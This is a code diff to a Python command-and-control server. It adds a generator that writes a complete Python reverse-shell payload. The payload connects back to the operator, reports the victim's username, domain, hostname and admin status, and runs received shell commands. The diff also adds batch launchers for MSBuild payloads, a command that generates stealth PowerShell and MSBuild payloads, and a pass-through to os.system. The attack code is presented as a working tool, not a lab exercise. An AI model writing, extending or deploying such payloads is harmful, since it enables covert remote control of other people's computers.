@@ -2,7 +2,7 @@ from time import sleep
 import netifaces as ni
 import threading
 import socket
-import os
+import os, sys
 
 
 ###################COLORS#################
@@ -162,6 +162,10 @@ def gen_msbuild_stealth():
         f.write(xml_payload)
         f.close()
 
+    with open('RUN-msbuild-stealth.bat', 'w') as f:
+        f.write(r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild-stealth.xml')
+        f.close()
+
 def gen_msbuild():
     xml_payload = ''
     xml_payload += '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
@@ -291,6 +295,10 @@ def gen_msbuild():
         f.write(xml_payload)
         f.close()
 
+    with open('RUN-msbuild.bat', 'w') as f:
+        f.write(r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml')
+        f.close()
+
 def gen_ps():
 
     ps_payload = ''
@@ -349,6 +357,103 @@ def gen_ps():
         f.write(ps_payload)
         f.close()
 
+def gen_python():
+    pypayload = ''
+    pypayload += 'import socket\n'
+    pypayload += 'import subprocess\n'
+    pypayload += 'import os\n'
+    pypayload += 'import platform\n'
+    pypayload += 'from ctypes import *\n'
+    pypayload += 'from time import sleep\n'
+
+    pypayload += 'def is_admin():\n'
+    pypayload += '    is_admin = False\n'
+    pypayload += '    is_admin = windll.shell32.IsUserAnAdmin() != 0\n'
+    pypayload += '    return is_admin\n'
+
+    pypayload += 'def os_check():\n'
+    pypayload += '    system = str(platform.system()) + " " + str(platform.release())\n'
+    pypayload += '    return system\n'
+
+    pypayload += 'def server_run_command(command):\n'
+    pypayload += '    try:\n'
+    pypayload += '        subp_output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'
+
+    pypayload += '        if len(str(subp_output.stderr)) < 5:\n'
+    pypayload += '            if len(str(subp_output.stdout)) < 5:\n'
+    pypayload += '                return "Command successfully executed."\n'
+    pypayload += '            else:\n'
+    pypayload += '                tmp = subp_output.stdout\n'
+    pypayload += '                to_str = tmp.split(b"\\n")\n'
+    pypayload += '                strs = ""\n'
+    pypayload += '                for x in to_str:\n'
+    pypayload += '                    strs += (str(x) + "\\n")\n'
+    pypayload += '                strs = strs.replace("b\\\'\\\\r\\\'", "")\n'
+    pypayload += '                strs = strs.replace("b\\\'", "")\n'
+    pypayload += '                strs = strs.replace("\\\\r\\\'", "")\n'
+    pypayload += '                strs = strs.replace("b\' \'", "")\n'
+    pypayload += '                return strs\n'
+    pypayload += '        else:\n'
+    pypayload += '            tmp = subp_output.stderr\n'
+    pypayload += '            to_str = tmp.split(b"\\n")\n'
+    pypayload += '            strs = ""\n'
+    pypayload += '            for x in to_str:\n'
+    pypayload += '                strs += (str(x) + "\\n")\n'
+    pypayload += '            strs = strs.replace("b\\\'\\\\r\\\'", "")\n'
+    pypayload += '            strs = strs.replace("b\\\'", "")\n'
+    pypayload += '            strs = strs.replace("\\\\r\\\'", "")\n'
+    pypayload += '            strs = strs.replace("b\' \'", "")\n'
+    pypayload += '            return strs\n'
+    pypayload += '        return subp_output.stderr\n'
+    pypayload += '    except Exception as e:\n'
+    pypayload += '        return e\n'
+
+    pypayload += 'def main():\n'
+    pypayload += '    PORT = %s\n' % PORT
+    pypayload += '    SERVER = "%s"\n' % local_ip
+    pypayload += '    ADDR = (SERVER, PORT)\n'
+    pypayload += '    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
+    pypayload += '    try:\n'
+    pypayload += '        client.connect(ADDR)\n'
+    pypayload += '    except BaseException:\n'
+    pypayload += '        main()\n'
+
+    pypayload += '    if is_admin():\n'
+    pypayload += '        admin = "Admin"\n'
+    pypayload += '    else:\n'
+    pypayload += '        admin = "User"\n'
+
+    pypayload += '    client.send((str(os_check()) + "," + admin + "," + os.environ["userdomain"] + "," + os.environ["USERNAME"] + "," + os.environ["COMPUTERNAME"] + ",Python").encode())\n'
+
+    pypayload += '    while True:\n'
+    pypayload += '        command = ""\n'
+    pypayload += '        try:\n'
+    pypayload += '            command = client.recv(2048).decode()\n'
+    pypayload += '            client.sendall(r"Command recieved\\r".encode())\n'
+
+    pypayload += '            if command == "exit":\n'
+    pypayload += '                break\n'
+    pypayload += '            elif (command == "get_host_info"):\n'
+    pypayload += '                client.sendall(str(os.getcwd() + "> ").encode())\n'
+    pypayload += '            else:\n'
+    pypayload += '                commrtrn = server_run_command(command)\n'
+    pypayload += '                client.sendall(str(len(commrtrn)).zfill(12).encode())\n'
+    pypayload += '                client.sendall(str(commrtrn).encode())\n'
+
+    pypayload += '        except socket.error as e:\n'
+    pypayload += '            print(e)\n'
+    pypayload += '            sleep(5)\n'
+    pypayload += '            main()\n'
+    pypayload += '        except BaseException as e:\n'
+    pypayload += '            print(e)\n'
+    pypayload += '            continue\n'
+
+    pypayload += 'if __name__ == "__main__":\n'
+    pypayload += '    main()\n'
+
+    with open('python.py', 'w') as f:
+        f.write(pypayload)
+        f.close()
 
 def gen_ps_stealth():
     ps_payload = ''
@@ -509,13 +614,6 @@ def server_start():
 def main():
     server_status = False
 
-    gen_msbuild()
-    gen_msbuild_stealth()
-    gen_ps()
-    gen_ps_stealth()
-    gen_ps_oneliner()
-    gen_ps_oneliner_stealth()
-
     while True:
         command = parse_args(input(color_reset + "Enter a command: "))  # get our command while not in  the shell
 
@@ -574,8 +672,6 @@ def main():
 
                     print(big_recieve(shell_id)) # if were running a cmd command this is the output
 
-
-
                 except socket.error:
                     print(color_RED + "[ERROR] The client could not be reached")
                     print(color_YELL + "[WORKING] Removing client from list")
@@ -600,8 +696,12 @@ def main():
             server_start()
             server_status = True;
         elif (command[0] == "cls" or command[0] == "clear"):  # does not work in ide but in regular console
-            cls = lambda: os.system('cls')
-            cls()
+            if sys.platform != "linux":
+                cls = lambda: os.system('cls') # windows
+                cls()
+            else:
+                cls = lambda: os.system('clear') # linux/mac
+                cls()
         elif (command[0] == "clients" and server_status == False):
             print(color_RED + "[ERROR] Please start the server to use that command" + color_reset)
         elif (command[0] == "shell" and server_status == False):
@@ -609,10 +709,30 @@ def main():
         elif ((command[0] == "help" or command[0] == "-help") and server_status == False):
             print("Commands".ljust(25), "Description")
             print("server_start".ljust(25), "Starts the server")
+            print("gen_payloads".ljust(25), "Generates payload files")
         elif ((command[0] == "help" or command[0] == "-help") and server_status == True):
             print("Commands".ljust(25), "Description")
             print("shell [Client_ID]".ljust(25), "Connects to the shell")
             print("clients".ljust(25), "Prints a list of clients")
+            print("gen_payloads".ljust(25), "Generates payload files")
+        elif (command[0] == 'gen_payloads'):
+            print("Generating payloads")
+            gen_msbuild()
+            gen_msbuild_stealth()
+            gen_ps()
+            gen_ps_stealth()
+            gen_ps_oneliner()
+            gen_ps_oneliner_stealth()
+            gen_python()
+        elif (command[0] == 'exit' or command[0] == 'quit'):
+            sys.exit(0)
+        else:
+            if len(command) > 1: # if they wat to run other commands within out shell
+                runit = lambda: os.system(command[0] + ' ' + command[1])
+                runit()
+            else:
+                runit = lambda: os.system(command[0])
+                runit()
 
 if __name__ == "__main__":
     main()
